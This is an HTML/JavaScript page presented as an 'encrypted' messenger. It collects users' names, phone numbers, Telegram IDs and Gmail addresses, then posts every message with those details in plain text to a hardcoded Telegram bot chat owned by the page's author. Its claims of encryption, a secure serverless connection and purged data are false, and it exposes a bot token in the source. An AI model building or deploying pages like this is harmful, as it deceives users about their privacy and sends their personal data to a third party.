<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>x ms | Encrypted Messenger</title>
    <style>
        :root { --neon: #00ff41; --dark: #050505; --gray: #1a1a1a; }
        body { background: var(--dark); color: var(--neon); font-family: 'Consolas', 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .app-window { border: 2px solid var(--neon); width: 100%; max-width: 380px; height: 90vh; display: flex; flex-direction: column; background: var(--dark); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); position: relative; }
        .header { padding: 15px; border-bottom: 1px solid var(--neon); text-align: center; letter-spacing: 5px; font-weight: bold; background: rgba(0, 255, 65, 0.05); }
        .content { flex: 1; padding: 20px; overflow-y: auto; }
        input, select, textarea { width: 100%; background: var(--gray); border: 1px solid var(--neon); color: var(--neon); padding: 12px; margin-bottom: 15px; outline: none; font-family: inherit; }
        button { width: 100%; background: var(--neon); color: var(--dark); border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        button:hover { background: #008f11; color: white; box-shadow: 0 0 15px var(--neon); }
        .deliverer-contact { border: 1px dashed var(--neon); padding: 20px; text-align: center; cursor: pointer; margin-top: 30px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
        .hidden { display: none; }
        .info-tag { font-size: 10px; color: #008f11; margin-bottom: 5px; }
        .status-footer { font-size: 9px; padding: 10px; border-top: 1px solid var(--neon); text-align: center; opacity: 0.6; }
    </style>
</head>
<body>

<div class="app-window">
    <div class="header">X MS v2.0</div>
    
    <!-- LOGIN PANEL -->
    <div id="auth" class="content">
        <p class="info-tag">> IDENTITY REQUIRED</p>
        <input type="text" id="u_name" placeholder="CODENAME (Ism)">
        <input type="tel" id="u_phone" placeholder="TEL: +998XXXXXXXXX">
        <input type="text" id="u_tgid" placeholder="YOUR TELEGRAM ID">
        <input type="email" id="u_mail" placeholder="GMAIL (Alert backup)">
        <button onclick="access()">INITIALIZE ACCESS</button>
    </div>

    <!-- MESSENGER PANEL -->
    <div id="messenger" class="content hidden">
        <div id="agent-label" class="info-tag" style="margin-bottom: 20px;"></div>
        
        <div class="deliverer-contact" onclick="openDeliverer()">
            [+] DELIVERER (Yetkazuvchi)
        </div>

        <div id="role-menu" class="hidden">
            <p class="info-tag" style="margin-top:20px;">> SELECT CHANNEL:</p>
            <select id="role">
                <option value="BOSS">FOR BOSS</option>
                <option value="CODER">FOR CODER</option>
                <option value="KILLER">FOR KILLER</option>
                <option value="SPY">FOR SPY</option>
                <option value="MR_N0_0NE">FOR MR_n0_0ne</option>
            </select>
            <textarea id="msg" rows="4" placeholder="ENTER SECRET DATA..."></textarea>
            <button onclick="sendData()">TRANSMIT DATA</button>
        </div>
    </div>

    <div class="status-footer">SECURE CONNECTION: 100% | SERVERLESS MODE</div>
</div>

<script>
    // Konfiguratsiya - Sening ma'lumotlaring o'rnatildi
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const MASTER_ID = "6198817749";

    function access() {
        const user = {
            n: document.getElementById('u_name').value,
            p: document.getElementById('u_phone').value,
            t: document.getElementById('u_tgid').value,
            m: document.getElementById('u_mail').value
        };

        if(!user.n || !user.p) return alert("DATA INCOMPLETE!");
        
        localStorage.setItem('x_agent', JSON.stringify(user));
        loadInterface(user);
    }

    function loadInterface(user) {
        document.getElementById('auth').classList.add('hidden');
        document.getElementById('messenger').classList.remove('hidden');
        document.getElementById('agent-label').innerHTML = `AGENT: ${user.n.toUpperCase()}<br>STATUS: ACTIVE`;
    }

    function openDeliverer() {
        document.getElementById('role-menu').classList.toggle('hidden');
    }

    async function sendData() {
        const user = JSON.parse(localStorage.getItem('x_agent'));
        const role = document.getElementById('role').value;
        const text = document.getElementById('msg').value;

        if(!text) return alert("EMPTY MESSAGE!");

        const report = `
⚡️ **X-MS ENCRYPTED REPORT** ⚡️
----------------------------
👤 **AGENT:** ${user.n}
📞 **TEL:** ${user.p}
🆔 **TG:** ${user.t}
📧 **MAIL:** ${user.m}
----------------------------
🎯 **CHANNEL:** ${role}
📝 **DATA:** ${text}
----------------------------
        `;

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: MASTER_ID,
                    text: report,
                    parse_mode: "Markdown"
                })
            });

            if(res.ok) {
                alert("TRANSMISSION SUCCESSFUL. DATA PURGED.");
                document.getElementById('msg').value = "";
                document.getElementById('role-menu').classList.add('hidden');
            } else {
                alert("TRANSMISSION FAILED. CHECK BOT STATUS.");
            }
        } catch(e) {
            alert("NO UPLINK DETECTED.");
        }
    }

    window.onload = () => {
        const saved = localStorage.getItem('x_agent');
        if(saved) loadInterface(JSON.parse(saved));
    }
</script>
</body>
</html>
